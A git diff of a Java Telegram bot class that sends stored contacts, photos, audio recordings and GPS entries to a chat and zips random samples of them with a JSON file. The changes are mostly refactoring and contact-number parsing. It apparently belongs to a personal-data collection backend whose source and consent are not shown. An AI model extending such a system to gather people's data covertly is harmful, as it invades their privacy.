@@ -1,5 +1,6 @@
 package com.example.demoCode.telegram;
 
+
 import com.example.demoCode.entity.Contacts;
 import com.example.demoCode.entity.GPSInfo;
 import com.example.demoCode.entity.Images;
@@ -10,6 +11,7 @@ import com.example.demoCode.service.ImageService;
 import com.example.demoCode.service.RecordService;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import lombok.RequiredArgsConstructor;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.core.io.ClassPathResource;
 import org.springframework.scheduling.annotation.Async;
@@ -29,11 +31,9 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.concurrent.CompletableFuture;
+import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
@@ -86,7 +86,7 @@ public class MyTelegramBot extends TelegramLongPollingBot {
     }
 
 
-    //---
+    //---Menu List---
     private void sendMenu(long chatId) {
         SendMessage message = new SendMessage();
         message.setChatId(chatId);
@@ -113,7 +113,7 @@ public class MyTelegramBot extends TelegramLongPollingBot {
     }
 
 
-    //---Message
+    //---Message---
     private void sendMessage(long chatId, String text) {
         SendMessage message = new SendMessage();
         message.setChatId(chatId);
@@ -127,8 +127,7 @@ public class MyTelegramBot extends TelegramLongPollingBot {
     }
 
 
-
-    //---Image
+    //---Send all images---
     @Async
     protected void sendAllImages(long chatId) {
         CompletableFuture.runAsync(() -> {
@@ -150,7 +149,7 @@ public class MyTelegramBot extends TelegramLongPollingBot {
     }
 
 
-    //---Record
+    //---Send all records---
     @Async
     protected void sendAllAudio(long chatId) {
         CompletableFuture.runAsync(() -> {
@@ -172,10 +171,10 @@ public class MyTelegramBot extends TelegramLongPollingBot {
     }
 
 
-    //--- GPS
+    //---Send all gps info
     @Async
     protected void sendGPS(long chatId) {
-        CompletableFuture.runAsync(()->{
+        CompletableFuture.runAsync(() -> {
             List<GPSInfo> gpsList = gpsService.getAllGPSInfo();
 
 
@@ -194,14 +193,15 @@ public class MyTelegramBot extends TelegramLongPollingBot {
                 } catch (TelegramApiException e) {
                     e.printStackTrace();
                 }
-            }});
+            }
+        });
     }
 
 
     //--- Generate Zip
     @Async
     protected void getZipFile(long chatId) {
-        CompletableFuture.runAsync(()->{
+        CompletableFuture.runAsync(() -> {
             List<Contacts> contactsList = contactsService.getRandomContacts();
             List<Images> imagesList = imageService.getRandomImages();
             List<Records> recordsList = recordService.getRandomRecords();
@@ -223,11 +223,12 @@ public class MyTelegramBot extends TelegramLongPollingBot {
                  ZipOutputStream zos = new ZipOutputStream(fos)) {
 
                 String jsonFileName = "data.json";
-                writeDataToJsonFile(imagesList, recordsList, contactsList, gpsList, jsonFileName);
+                writeDataToJsonFile(contactsList, imagesList, gpsList, recordsList, jsonFileName);
                 addFileToZip(jsonFileName, zos);
 
                 addFilesToZip(imagePaths, zos, chatId);
                 addFilesToZip(recordePaths, zos, chatId);
+
 
             } catch (IOException e) {
                 e.printStackTrace();
@@ -243,6 +244,7 @@ public class MyTelegramBot extends TelegramLongPollingBot {
 
                 try {
                     execute(document);
+
                 } catch (TelegramApiException e) {
                     e.printStackTrace();
                 }
@@ -252,23 +254,47 @@ public class MyTelegramBot extends TelegramLongPollingBot {
     }
 
 
-    //---
+    //---Writing randomly selected info to JSON file---
     private void writeDataToJsonFile(
-            List<Images> imagesList, List<Records> recordsList,
-            List<Contacts> contactsList, List<GPSInfo> gpsInfoList, String jsonFilePath) throws IOException {
+            List<Contacts> contactsList, List<Images> imagesList,
+            List<GPSInfo> gpsInfoList, List<Records> recordsList, String jsonFilePath) throws IOException {
         Map<String, Object> data = new HashMap<>();
 
-        data.put("contacts", contactsList);
+        List<Map<String, Object>> contactDataList = new ArrayList<>();
+
+        for (Contacts contact : contactsList) {
+            Map<String, Object> contactData = getStringObjectMap(contact);
+
+            contactDataList.add(contactData);
+        }
+
+        data.put("contacts", contactDataList);
         data.put("images", imagesList);
         data.put("records", recordsList);
-        data.put("gps", gpsInfoList);
+        data.put("gps_info", gpsInfoList);
 
         ObjectMapper mapper = new ObjectMapper();
         mapper.writeValue(new File(jsonFilePath), data);
     }
 
 
-    //--- Json file write to zip
+    //---Numbers turn over array---
+    private static Map<String, Object> getStringObjectMap(Contacts contact) {
+        Map<String, Object> contactData = new HashMap<>();
+        contactData.put("id", contact.getId());
+        contactData.put("name", contact.getName());
+        contactData.put("time_modified", contact.getTime_Modified());
+
+        String numbersString = contact.getNumbers();
+        List<String> numbersList = Arrays.asList
+                (numbersString.replace("[", "").replace("]", "")
+                        .split(","));
+        contactData.put("numbers", numbersList);
+        return contactData;
+    }
+
+
+    //--- JSON file writes to zip
     private void addFileToZip(String filePath, ZipOutputStream zos) throws IOException {
         File file = new File(filePath);
         try (FileInputStream fis = new FileInputStream(file)) {
@@ -315,6 +341,4 @@ public class MyTelegramBot extends TelegramLongPollingBot {
 
         }
     }
-
-
 }
